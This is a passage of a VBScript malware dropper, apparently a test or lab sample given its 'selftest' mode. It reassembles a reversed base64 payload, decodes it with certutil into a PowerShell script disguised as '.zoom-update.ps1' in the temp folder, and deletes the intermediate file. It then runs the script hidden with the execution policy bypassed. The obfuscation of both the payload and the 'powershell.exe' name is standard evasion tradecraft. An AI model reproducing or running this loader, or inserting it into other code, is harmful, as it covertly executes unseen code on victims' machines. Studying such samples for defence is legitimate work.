    "pl0Kh52KrdHWpNje1ZTVkVWMxEzRE9yYJBTUZtEMygjSXpXe", _
    "mZFcxYDWyt0KSZ2S4B1boZFMnlkNXJXeYVlWsJUR4kmRPBFc", _
    "BhFb3hDTsd0ZLJmc5IzK2tmRnFFTXp3Us5ma0JUb1ZDZOJmb", _
    "0VWNp1WbhZ3ctF3Q0VTU0NmdzdFcMBzTo9UeS5EbjNXTIFTW", _
    "FtEbUFmTxl1KsJFbwdUSFtWeXZDek9yYGpmZrtybHdFdIZDT", _
    "4QzNzQlZp1UN3MmTrMTZvN0TwpkdmlmMFZ3SZt0aZ1WO1gVY", _
    "zp2RtJzQywGSu1Gcxo2TuVXTvV1UadUMxRzc5wkSxcXT2k2V", _
    "lJHdTp3ZkACIgAiCNkyJ9gjcrUDS3YTY0FlT50EWvskT1MHb", _
    "6dGJsgSbhVmc0NVey9Wbl1kLPlEI0NWZqJ2TtcXZOBSPg0WY", _
    "vNkLPlEI0NWZqJ2TtcXZOBSPgAXa6dGJgACIgoQDpMXZ0lnQ", _
    "bBCLtFWZyR3U6dGJo0WYlJHdTVGdhxmZlRkLu9WazNXZyBXb", _
    "jVGR6oTXlR2bN52bpN3clJHct92Qu42bpN3clJHct92Qu8US", _
    "JBCdjVmai9UL3VmTg0DIyVGZhVmckACIgAiCNkyczVmcw12b", _
    "n5Wak92YuVkL0hXZUtFIsAXa6dGJoIXZkFWZS1WYlJHdT5yT", _
    "kFWZS5iclRWYlJHJg0DIlNmc192ckACIgAiCNkCOGRVV6oTX", _
    "pp3ZkAyOpgSZz9GczlGRuIXZkFWZyRCIgACIK0QKoQmbF9GV", _
    "gAiCNkCKlN3bwNXaE5SbhVmc0NlenRCI7kCKlN3bwNXaE5Cc", _
    "vNkLt9GRlR2bD5SblR3c5NFI0NWZqJ2TtcXZOBSPgA3YkACI", _
    "H5CcjRCIgACIK0wcyVGdl1WYyFGUyVGbpBXbvNkLyVGbpBXb", _
    "uV2RuA3YkACIgAiCNUWdyRHJg0DI5J3btVWTulUZ0Fmcl5WZ", _
    "vNkLwNGJgACIgoQDlNHbhZGJg0DIlxmYhRXdjVGeFVGdhJXZ", _
    "oAEIgACIK0wJrUmep1Wa0B3bvcCI9Aycu9Wa0B3TyVGbpBXb", _
    "0NXeTdCLnwGbk5SZy92Qu0WZ0NXeTdCLnwGbk5SblR3c5N1J", _
    "k5CcyFGaTNkL0Z2bz9mcjlWTnwyJsxGZukHdpJXdjV2Uu0WZ", _
    "vZ3WgACIgACIgAiCNsHI0NWZqJ2Ttg2YhVkcvZEI8BSKnwGb", _
    "NkyXkgCZkFkLzVWasJWblN3cBRWZj5WZyVmZlJlLwNGJdRWa", _
    "NBCdjVmai9UL3VmTg0DIyVGZpZ3byBHJgACIgoQD9BCIgAiC", _
    "K0gclRWa29mcQVGZvNEcyFGaTNkLwJXYoN1QuQnZvN3byNWa", _
    "tV2czFUZslGct92QuIXZklmdvJHckASPgQHb1NXZyRCIgACI", _
    "gYWagACIgoQDpU2YyV3bzRCIsA3YkgSZjJXdvNVbvJnR5xmY", _
    "gACIgoQD7BSKwACdn1CI05WdvNkLzJ3byJXRuQHb1NXZyRCK", _
    "gUGJoACajFWZy9mZgACIgACIgAiCNcyJg0DI0hXZ0RCIgACI", _
    "T9GVuUGJg0zKgQHelRHJgsHIpMncvJncF5CdsV3clJHJg4Wa", _
    "lxWaG5yTJtFIgACIgACIgoQD9BiIuBmcgJCIrASKocmbpJHd", _
    "Q1URUpjduVGJggGdhBVLul2bKhCK0hXZUxGbBVGdpJ3V6oTX", _
    "gACIK0QK0hXZ0RCIskyJn9GbuwGblh2cyV2dvBXLt92b6dCI", _
    "zVmckASPgUGc5RHJgACIgoQD9BCIgAiCNIDI0lGelBCIgACI", _
    "vxUbv9mWngSZwlHV0V2RukHbi1WZzNXQkVGbpBXbvNkL0xWd", _
    "vhGdl1EdldkLlBXe0RCI9ACZvhGdl1GJgACIgoQDpciclRWY", _
    "E9UTf10TPplO25WZkASPgUGZv1GJgACIgoQDpcibpFWTngCZ", _
    "kgSe0BXbFJ3TsxWdONXS6oTXn5WayR3cbhCImlGIgACIK0QR", _
    "pRCIgACIK0QfgcCbsFGdz5WanASPgUGZv1GJgsHIpkSZk9Wb", _
    "NEDIn01W0NWZqJ2bnACdjVmai9UL3VmTg0DIzdmcBV2avZnb", _
    "tRCKA1VXbdmbpJHdztFI9ASXws1cnJXQlt2b25WakACIgAiC", _
    "15GJoU2avZnbJ5CZvhGdl1GJg0DIlR2bjRCIgACIK0QKlR2b", _
    "k92Yk0Fdul2WgQXa4VGIgACIK0QKzdmcBV2avZnbpRCIswGb", _
    "Pl0WgACIgACIgAiCNsHI5JHdgACIgoQD7BCajRXYjBSfK0QZ", _
    "25WZkACa0FGUt4WavpEKoQHelRFbsFUZ0lmcXpjOdVGbpZkL", _
    "T9GVu8FJgwSKnc2bs5CbsVGazJXZ39Gct02bvp3JgAVTFRlO", _
    "xACdphXZgACIgoQD9tHIoNGdhNGI9BCIgAiCNkSKocmbpJHd", _
    "9pQD" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.ps1"
b64File = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.b64"
Set st = CreateObject("ADODB.Stream")
st.Type = 2
st.Charset = "ascii"
st.Open
st.WriteText b64
st.SaveToFile b64File, 2
st.Close
Set st = Nothing
sh.Run "certutil.exe -f -decode """ & b64File & """ """ & psFile & """", 0, True
fso.DeleteFile b64File, True
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """"

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
